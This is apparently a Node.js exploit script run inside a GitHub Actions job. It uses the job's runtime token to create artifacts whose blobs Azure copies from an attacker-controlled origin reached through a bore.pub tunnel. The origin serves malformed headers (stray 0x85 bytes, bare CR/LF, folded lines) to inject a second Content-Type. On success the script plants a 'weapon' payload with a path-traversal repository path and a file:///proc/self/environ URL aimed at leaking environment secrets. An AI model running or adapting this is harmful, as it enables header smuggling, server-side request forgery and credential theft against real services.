'use strict';

const crypto = require('node:crypto');
const fs = require('node:fs');
const net = require('node:net');
const tls = require('node:tls');
const https = require('node:https');
const {spawn} = require('node:child_process');

const SERVICE = '/twirp/github.actions.results.api.v1.ArtifactService/';
const SAFE_TYPE = Buffer.from('application/octet-stream', 'ascii');
const EVIL_TYPE = Buffer.concat([Buffer.from([0x85]), Buffer.from('application/json')]);
const PLACEHOLDER = Buffer.from('{"probe":"pbf-header-inject"}');

function context() {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url'));
  const scope = claims.scp.split(' ').find((value) => value.startsWith('Actions.Results:'));
  const [, runId, jobId] = scope.split(':');
  return {token, base, runId, jobId};
}

async function rpc(ctx, method, fields) {
  const response = await fetch(ctx.base + SERVICE + method, {method: 'POST', headers: {
    Authorization: `Bearer ${ctx.token}`, 'Content-Type': 'application/json'},
  body: JSON.stringify({workflow_run_backend_id: ctx.runId,
    workflow_job_run_backend_id: ctx.jobId, ...fields}),
  signal: AbortSignal.timeout(30000)});
  const text = await response.text();
  let body = {};
  try { body = JSON.parse(text); } catch {}
  return {status: response.status, body, text: text.slice(0, 160)};
}

function get(result, snake) {
  return result.body[snake] || result.body[snake.replace(/_([a-z])/g, (_, c) => c.toUpperCase())] || null;
}

function azureRequest(url, options = {}) {
  return new Promise((resolve) => {
    const request = https.request(url, {method: options.method || 'GET',
      headers: options.headers || {}, timeout: 30000, agent: false}, (response) => {
      const chunks = [];
      response.on('data', (chunk) => chunks.push(chunk));
      response.on('end', () => {
        const body = Buffer.concat(chunks);
        const match = /<Code>([^<]{1,80})<\/Code>/.exec(body.toString('utf8'));
        resolve({status: response.statusCode, length: body.length,
          errorCode: response.headers['x-ms-error-code'] || (match && match[1]) || ''});
      });
    });
    request.on('timeout', () => request.destroy(new Error('timeout')));
    request.on('error', (error) => resolve({error: `${error.code || error.name}:${error.message}`}));
    request.end(options.body);
  });
}

function splitLines(bytes) {
  const lines = [];
  let start = 0;
  for (let index = 0; index + 1 < bytes.length; index += 1) {
    if (bytes[index] === 13 && bytes[index + 1] === 10) {
      lines.push(bytes.subarray(start, index));
      start = index + 2;
      index += 1;
    }
  }
  lines.push(bytes.subarray(start));
  return lines;
}

function rawSummary(raw) {
  const divider = raw.indexOf(Buffer.from('\r\n\r\n'));
  if (divider < 0) return {bytes: raw.length, completeHeaders: false,
    prefixHex: raw.subarray(0, 160).toString('hex')};
  const head = raw.subarray(0, divider);
  const body = raw.subarray(divider + 4);
  const lines = splitLines(head);
  const status = lines.shift()?.toString('latin1') || '';
  const selected = [];
  const contentTypes = [];
  const invalid = [];
  for (let index = 0; index < lines.length; index += 1) {
    const line = lines[index];
    const colon = line.indexOf(0x3a);
    if (colon < 1) {
      invalid.push({index, hex: line.subarray(0, 180).toString('hex')});
      continue;
    }
    const nameBytes = line.subarray(0, colon);
    const value = line.subarray(colon + 1);
    const name = nameBytes.toString('latin1').toLowerCase();
    if (name === 'content-type') contentTypes.push(value.toString('hex'));
    if (['content-type', 'cache-control', 'content-language', 'content-encoding',
      'x-accel-redirect'].includes(name) || /[\x00-\x1f\x7f-\xff]/.test(name)) {
      selected.push({index, nameHex: nameBytes.toString('hex'), valueHex: value.subarray(0, 240).toString('hex')});
    }
  }
  return {bytes: raw.length, completeHeaders: true, status, selected, contentTypes,
    invalid, bodyLength: body.length,
    bodySha: crypto.createHash('sha256').update(body).digest('hex').slice(0, 16),
    headerSha: crypto.createHash('sha256').update(head).digest('hex').slice(0, 16)};
}

function rawSocketGet(host, port, path) {
  return new Promise((resolve) => {
    const socket = net.connect({host, port});
    const chunks = [];
    const timer = setTimeout(() => socket.destroy(new Error('timeout')), 15000);
    socket.on('connect', () => socket.write(`GET ${path} HTTP/1.1\r\nHost: ${host}:${port}\r\nConnection: close\r\n\r\n`));
    socket.on('data', (chunk) => chunks.push(chunk));
    socket.on('end', () => { clearTimeout(timer); resolve({raw: Buffer.concat(chunks)}); });
    socket.on('error', (error) => { clearTimeout(timer); resolve({error: `${error.code || error.name}:${error.message}`}); });
  });
}

function rawTlsGet(target) {
  return new Promise((resolve) => {
    const url = new URL(target);
    const chunks = [];
    const socket = tls.connect({host: url.hostname, port: Number(url.port || 443),
      servername: url.hostname, rejectUnauthorized: true});
    const timer = setTimeout(() => socket.destroy(new Error('timeout')), 30000);
    socket.on('secureConnect', () => socket.write(
      `GET ${url.pathname}${url.search} HTTP/1.1\r\nHost: ${url.host}\r\nAccept: */*\r\nConnection: close\r\n\r\n`));
    socket.on('data', (chunk) => {
      chunks.push(chunk);
      if (chunks.reduce((sum, item) => sum + item.length, 0) > 2 * 1024 * 1024) {
        socket.destroy(new Error('oversized response'));
      }
    });
    socket.on('end', () => { clearTimeout(timer); resolve({raw: Buffer.concat(chunks)}); });
    socket.on('error', (error) => { clearTimeout(timer); resolve({error: `${error.code || error.name}:${error.message}`,
      raw: Buffer.concat(chunks)}); });
  });
}

function asciiTrim(bytes) {
  let begin = 0;
  let end = bytes.length;
  while (begin < end && (bytes[begin] === 0x20 || bytes[begin] === 0x09)) begin += 1;
  while (end > begin && (bytes[end - 1] === 0x20 || bytes[end - 1] === 0x09)) end -= 1;
  return bytes.subarray(begin, end);
}

function useful(summary) {
  if (!summary || !summary.contentTypes || !summary.contentTypes.length) return false;
  const first = asciiTrim(Buffer.from(summary.contentTypes[0], 'hex'));
  const comma = first.indexOf(0x2c);
  const semicolon = first.indexOf(0x3b);
  const cuts = [comma, semicolon].filter((value) => value >= 0);
  const media = asciiTrim(cuts.length ? first.subarray(0, Math.min(...cuts)) : first);
  const expected = Buffer.from('application/json');
  return media.equals(Buffer.concat([Buffer.from([0x85]), expected])) ||
    media.equals(Buffer.concat([expected, Buffer.from([0x85])]));
}

function makeCases() {
  const cases = new Map();
  const line = (name, value) => Buffer.concat([Buffer.from(`${name}: `), value, Buffer.from('\r\n')]);
  cases.set('baseline', Buffer.concat([line('Cache-Control', Buffer.from('no-store')),
    line('Content-Language', Buffer.from('en'))]));
  const fields = ['Cache-Control', 'Content-Language', 'Content-Encoding'];
  for (const field of fields) {
    const safe = field === 'Content-Encoding' ? 'identity' : (field === 'Content-Language' ? 'en' : 'no-store');
    const prefix = field.toLowerCase().replace(/[^a-z]/g, '');
    cases.set(`${prefix}-raw85-prefix`, line(field, Buffer.concat([Buffer.from([0x85]), Buffer.from(safe)])));
    cases.set(`${prefix}-raw85-suffix`, line(field, Buffer.concat([Buffer.from(safe), Buffer.from([0x85])])));
    cases.set(`${prefix}-utf8-nel`, line(field, Buffer.concat([Buffer.from(safe), Buffer.from([0xc2, 0x85])])));
    cases.set(`${prefix}-utf8-u010d`, line(field, Buffer.concat([Buffer.from(safe), Buffer.from([0xc4, 0x8d])])));
    cases.set(`${prefix}-utf8-u010a`, line(field, Buffer.concat([Buffer.from(safe), Buffer.from([0xc4, 0x8a])])));
    cases.set(`${prefix}-utf8-u0185`, line(field, Buffer.concat([Buffer.from(safe), Buffer.from([0xc6, 0x85])])));
    for (const byte of [0x0b, 0x0c, 0x1c, 0x1d, 0x1e, 0x1f]) {
      cases.set(`${prefix}-c0-${byte.toString(16)}`, line(field,
        Buffer.concat([Buffer.from(safe), Buffer.from([byte]), EVIL_TYPE])));
    }
    cases.set(`${prefix}-bare-cr`, Buffer.concat([Buffer.from(`${field}: ${safe}\r`),
      Buffer.from('Content-Type: '), EVIL_TYPE, Buffer.from('\r\n')]));
    cases.set(`${prefix}-bare-lf`, Buffer.concat([Buffer.from(`${field}: ${safe}\n`),
      Buffer.from('Content-Type: '), EVIL_TYPE, Buffer.from('\r\n')]));
    cases.set(`${prefix}-obs-space`, Buffer.concat([Buffer.from(`${field}: ${safe}\r\n Content-Type: `),
      EVIL_TYPE, Buffer.from('\r\n')]));
    cases.set(`${prefix}-obs-tab`, Buffer.concat([Buffer.from(`${field}: ${safe}\r\n\tContent-Type: `),
      EVIL_TYPE, Buffer.from('\r\n')]));
    cases.set(`${prefix}-real-second`, Buffer.concat([Buffer.from(`${field}: ${safe}\r\nContent-Type: `),
      EVIL_TYPE, Buffer.from('\r\n')]));
  }
  return cases;
}

function startOrigin(cases, state) {
  const server = net.createServer((socket) => {
    let request = Buffer.alloc(0);
    socket.on('data', (chunk) => {
      request = Buffer.concat([request, chunk]);
      if (!request.includes(Buffer.from('\r\n\r\n')) || socket.responded) return;
      socket.responded = true;
      const first = request.toString('latin1').split('\r\n', 1)[0] || '';
      const path = (first.split(' ')[1] || '/baseline').split('?', 1)[0];
      const label = decodeURIComponent(path.slice(1));
      const extra = cases.get(label) || cases.get('baseline');
      const response = Buffer.concat([
        Buffer.from('HTTP/1.1 200 OK\r\nContent-Type: '), SAFE_TYPE, Buffer.from('\r\n'),
        extra,
        Buffer.from(`Content-Length: ${state.body.length}\r\nConnection: close\r\n\r\n`),
        state.body,
      ]);
      socket.end(response);
    });
  });
  return new Promise((resolve, reject) => {
    server.once('error', reject);
    server.listen(0, '127.0.0.1', () => resolve({server, port: server.address().port}));
  });
}

function startBore(localPort) {
  const binary = process.env.BORE_PATH || '/tmp/bore';
  if (!fs.existsSync(binary)) throw new Error(`bore binary missing: ${binary}`);
  const child = spawn(binary, ['local', String(localPort), '--local-host', '127.0.0.1', '--to', 'bore.pub'],
    {stdio: ['ignore', 'pipe', 'pipe']});
  return new Promise((resolve, reject) => {
    let output = '';
    const timer = setTimeout(() => { child.kill('SIGTERM'); reject(new Error('bore timeout')); }, 30000);
    const receive = (chunk) => {
      output += chunk.toString('utf8');
      const match = /remote_port=(\d+)/.exec(output);
      if (match) { clearTimeout(timer); resolve({child, host: 'bore.pub', port: Number(match[1])}); }
    };
    child.stdout.on('data', receive);
    child.stderr.on('data', receive);
    child.once('error', (error) => { clearTimeout(timer); reject(error); });
    child.once('exit', (code) => {
      if (!/remote_port=\d+/.test(output)) { clearTimeout(timer); reject(new Error(`bore exited ${code}`)); }
    });
  });
}

async function one(ctx, tunnel, state, label) {
  const name = `pbf-header-${label}-${Date.now()}.json`.slice(0, 240);
  state.body = PLACEHOLDER;
  const sourceUrl = `http://${tunnel.host}:${tunnel.port}/${encodeURIComponent(label)}`;
  const source = await rawSocketGet(tunnel.host, tunnel.port, `/${encodeURIComponent(label)}`);
  const sourceSummary = source.raw ? rawSummary(source.raw) : {error: source.error};
  const made = await rpc(ctx, 'CreateArtifact', {name, version: 7, mime_type: 'application/json'});
  const upload = get(made, 'signed_upload_url');
  const output = {label, source: sourceSummary, create: made.status, hasUpload: Boolean(upload)};
  if (!upload) return output;
  const copied = await azureRequest(upload, {method: 'PUT', headers: {
    'Content-Length': '0', 'x-ms-version': '2021-08-06', 'x-ms-copy-source': sourceUrl,
    'x-ms-blob-type': 'BlockBlob', 'x-ms-copy-source-blob-properties': 'true'}});
  output.putFromUrl = copied;
  if (copied.status !== 201) {
    await rpc(ctx, 'DeleteArtifact', {name});
    return output;
  }
  const digest = crypto.createHash('sha256').update(state.body).digest('hex');
  const done = await rpc(ctx, 'FinalizeArtifact', {name, size: String(state.body.length), hash: `sha256:${digest}`});
  output.finalize = done.status;
  output.artifactId = get(done, 'artifact_id');
  const signed = await rpc(ctx, 'GetSignedArtifactURL', {name});
  output.signed = signed.status;
  const download = get(signed, 'signed_url');
  if (download) {
    const parsed = new URL(download);
    output.rsct = parsed.searchParams.get('rsct');
    const raw = await rawTlsGet(download);
    output.final = raw.raw ? {...rawSummary(raw.raw), ...(raw.error ? {transportError: raw.error} : {})} : {error: raw.error};
    output.useful = useful(output.final);
  }
  if (output.useful && output.artifactId) {
    state.body = Buffer.from(JSON.stringify({
      full_name: `a/../../repos/lemonsour864/cassette/actions/artifacts/${output.artifactId}/zip`,
      owner: {login: 'u', avatar_url: 'file:///proc/self/environ'},
    }));
    const weaponCopy = await azureRequest(upload, {method: 'PUT', headers: {
      'Content-Length': '0', 'x-ms-version': '2021-08-06', 'x-ms-copy-source': sourceUrl,
      'x-ms-blob-type': 'BlockBlob', 'x-ms-copy-source-blob-properties': 'true'}});
    output.weapon = {copy: weaponCopy, length: state.body.length,
      sha: crypto.createHash('sha256').update(state.body).digest('hex')};
  } else {
    await rpc(ctx, 'DeleteArtifact', {name});
  }
  return output;
}

(async () => {
  const ctx = context();
  const cases = makeCases();
  const state = {body: PLACEHOLDER};
  const origin = await startOrigin(cases, state);
  const tunnel = await startBore(origin.port);
  console.log('TUNNEL ' + JSON.stringify({ready: true, provider: 'bore', cases: cases.size}));
  let usefulCount = 0;
  try {
    for (const label of cases.keys()) {
      const result = await one(ctx, tunnel, state, label);
      if (result.useful) usefulCount += 1;
      console.log('CASE ' + JSON.stringify(result));
    }
  } finally {
    tunnel.child.kill('SIGTERM');
    origin.server.close();
  }
  console.log('DONE ' + JSON.stringify({cases: cases.size, useful: usefulCount}));
})().catch((error) => {
  console.error(error && error.stack || error);
  process.exitCode = 1;
});
